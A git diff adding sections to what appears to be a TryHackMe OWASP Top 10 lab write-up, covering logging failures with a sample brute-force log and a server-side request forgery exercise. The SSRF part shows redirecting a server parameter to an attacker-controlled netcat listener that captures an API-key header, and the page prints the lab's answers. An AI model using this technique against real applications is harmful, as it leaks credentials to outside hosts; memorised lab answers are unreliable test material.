@@ -56,7 +56,7 @@ What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining s
 What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.">
   <meta itemprop="datePublished" content="2024-06-30T00:00:00+00:00">
   <meta itemprop="dateModified" content="2024-06-30T00:00:00+00:00">
-  <meta itemprop="wordCount" content="2161">
+  <meta itemprop="wordCount" content="2535">
   <meta itemprop="keywords" content="TryHackMe">
 <meta name="referrer" content="no-referrer-when-downgrade" />
 
@@ -563,6 +563,100 @@ JWT token is formed of 3 parts: <code>Header</code>, <code>Payload</code> and <c
 <br></p>
 <p>Replace the value of the cookie to our modified token and refresh the page
 <img src="image-30.png" alt="alt text"></p>
+<br>
+<h3 id="9-security-logging-and-monitoring-failures">9. Security Logging and Monitoring Failures</h3>
+<p>When web applications are set up, every action performed by the user should be logged. Logging is important because if an incident occurs, the attackers&rsquo; activites can be traced. Once their actions are traced, their risk and impact can be determined.</p>
+<p>The information stored in logs should include the following:</p>
+<ul>
+<li>HTTP status codes</li>
+<li>Time Stamps</li>
+<li>Usernames</li>
+<li>API endpoints/page locations</li>
+<li>IP addresses</li>
+</ul>
+<p>These logs have sensitive information so it&rsquo;s important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#fab387">200</span> OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#fab387">200</span> OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">200</span> OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#fab387">200</span> OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">200</span> OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#fab387">200</span> OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#fab387">401</span> Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login</span></span></code></pre></div>
+<br>
+<p>What IP address is the attacker using?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>49.99.13.16</code></pre>
+<br>
+<p>What kind of attack is being carried out?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>brute force</code></pre>
+<br>
+<h3 id="10-server-side-request-forgery-ssrf">10. Server-Side Request Forgery (SSRF)</h3>
+<p>This type of vulnerability occurs when an attacker coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web applicatio nneeds to use third-party services.</p>
+<p>Navigate to <code>http://MACHINE_IP</code>, where you&rsquo;ll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website&rsquo;s restricted area!</p>
+<p>Explore the website. What is the only host allowed to access the admin area?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>localhost</code></pre>
+<br>
+<p>Check the &ldquo;Download Resume&rdquo; button. Where does the server parameter point to?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>secure-file-storage.com</code></pre>
+<p><img src="image-31.png" alt="alt text"></p>
+<br>
+<p>Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{Hello_Im_just_an_API_key}</code></pre>
+<p>replace <code>secure-file-storage.com</code> part with your own AttackBox IP address and run <code>nc -lvp 8087</code> command.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>┌──<span style="color:#89dceb;font-weight:bold">(</span>kali㉿kali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>└─$ nc -lvp <span style="color:#fab387">8087</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>listening on <span style="color:#89dceb;font-weight:bold">[</span>any<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">8087</span> ...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>10.10.245.216: inverse host lookup failed: Unknown host
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>connect to <span style="color:#89dceb;font-weight:bold">[</span>10.6.67.243<span style="color:#89dceb;font-weight:bold">]</span> from <span style="color:#89dceb;font-weight:bold">(</span>UNKNOWN<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">[</span>10.10.245.216<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#fab387">34718</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Host: 10.6.67.243:8087
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Accept: */*
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>X-API-KEY: THM<span style="color:#89dceb;font-weight:bold">{</span>Hello_Im_just_an_API_key<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
 <br>
 
   </content>
